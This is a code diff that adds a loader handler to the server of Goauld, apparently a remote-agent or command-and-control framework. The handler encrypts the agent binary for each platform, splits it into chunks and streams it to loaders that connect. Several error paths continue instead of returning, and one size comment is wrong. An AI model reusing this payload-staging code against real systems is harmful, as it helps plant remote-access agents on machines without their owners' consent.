@@ -3,9 +3,12 @@ package control
 
 import (
 	"Goauld/common"
+	"Goauld/common/crypto"
 	"errors"
 	"fmt"
 	"net/http"
+	"os"
+	"path/filepath"
 	"regexp"
 	"time"
 
@@ -63,6 +66,7 @@ func InitSocketIOServer(agentStore *store.AgentStore, db *persistence.DB) (*Sock
 			},
 			WebTransportServer:     nil,
 			WebSocketAcceptOptions: nil,
+			DisableMaxBufferSize:   true,
 		},
 	})
 	socketIO := &SocketIO{
@@ -97,6 +101,7 @@ func (sio *SocketIO) Setup(root *gosio.Namespace) {
 			// Decrypting the agent name using the age private key
 			log.Trace().Str("Agent.name", "?????").Str("Agent.ID", data.ID).Msg("START socketio.decrypting agent name")
 			agentName, err := config.Get().Decrypt(data.Name)
+
 			if err != nil {
 				errorMsg := fmt.Errorf("error decrypting name: %w", err)
 				socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
@@ -104,6 +109,12 @@ func (sio *SocketIO) Setup(root *gosio.Namespace) {
 					Code:    socketio.RegisterEvent.ID(),
 				})
 				log.Error().Str("Agent.name", "?????").Str("Agent.ID", data.ID).Err(err).Msg("socketio.RegisterError error decrypting agent name")
+
+				return
+			}
+			if data.Load {
+				// The agent is a loader
+				HandleLoader(socket, data, agentName)
 
 				return
 			}
@@ -498,4 +509,83 @@ func GetClipboard(agent *persistence.Agent, socket gosio.Socket, hashAgentPwd st
 	}
 
 	return response
+}
+
+func HandleLoader(socket gosio.ServerSocket, data socketio.Register, agentName string) {
+	sharedSecret, err := config.Get().Decrypt(data.SharedKey)
+	if err != nil {
+		errorMsg := fmt.Errorf("error decrypting shared secret: %w", err)
+		socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
+			Message: errorMsg.Error(),
+			Code:    socketio.RegisterEvent.ID(),
+		})
+		log.Error().Str("Type", "Loader").Str("Agent.name", "").Str("Agent.ID", data.ID).Err(err).Msg("socketio.RegisterError retrieving agent")
+	}
+	cryptor, err := crypto.NewCryptor(sharedSecret)
+	if err != nil {
+		errorMsg := fmt.Errorf("error decrypting shared secret: %w", err)
+		socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
+			Message: errorMsg.Error(),
+			Code:    socketio.RegisterEvent.ID(),
+		})
+		log.Error().Str("Type", "Loader").Str("Agent.name", agentName).Str("Agent.ID", data.ID).Err(err).Msg("socketio.RegisterError decrypting shared secret")
+
+		return
+	}
+	agentData, err := socketio.DecryptAgentSSHPasswordMessage(data.AgentData, cryptor)
+	if err != nil {
+		errorMsg := fmt.Errorf("error decrypting agent data: %w", err)
+		socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
+			Message: errorMsg.Error(),
+			Code:    socketio.RegisterEvent.ID(),
+		})
+		log.Error().Str("Type", "Loader").Str("Agent.name", agentName).Str("Agent.ID", data.ID).Err(err).Msg("socketio.RegisterError decrypting agent data")
+	}
+	binary := fmt.Sprintf("goauld_%s-%s", agentData.Platform, agentData.Architecture)
+	if agentData.Platform == "windows" {
+		binary += ".exe"
+	}
+	binaryData, err := os.ReadFile(filepath.Join(config.Get().BinariesPathLocation, binary))
+	if err != nil {
+		errorMsg := fmt.Errorf("error decrypting agent data: %w", err)
+		socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
+			Message: errorMsg.Error(),
+			Code:    socketio.RegisterEvent.ID(),
+		})
+		log.Error().Str("Type", "Loader").Str("Agent.name", agentName).Str("Agent.ID", data.ID).Err(err).Msg("error reading agent file binary")
+	}
+	chunks := Split(binaryData)
+	i := 0
+	for _, chunk := range chunks {
+		i++
+		chunkData, err := socketio.NewEncryptedChunkedAgent(i, len(chunks), chunk, cryptor)
+		if err != nil {
+			errorMsg := fmt.Errorf("error decrypting agent data: %w", err)
+			socket.Emit(socketio.RegisterError.ID(), socketio.SioError{
+				Message: errorMsg.Error(),
+				Code:    socketio.RegisterEvent.ID(),
+			})
+			log.Error().Str("Type", "Loader").Str("Agent.name", agentName).Str("Agent.ID", data.ID).Err(err).Msg("error encrypting agent chunk")
+		}
+		socket.Emit(socketio.ReceiveFatAgent.ID(), gosio.Binary(chunkData))
+		// time.Sleep(5 * time.Second)
+	}
+}
+
+func Split(data []byte) [][]byte {
+	const chunkSize = 1024 * 1024 // 5 MB
+	totalSize := len(data)
+	var chunks [][]byte
+	total := 0
+	for i := 0; i < totalSize; i += chunkSize {
+		end := i + chunkSize
+		if end > totalSize {
+			end = totalSize
+		}
+		chunk := data[i:end]
+		chunks = append(chunks, chunk)
+		total += len(chunk)
+	}
+
+	return chunks
 }
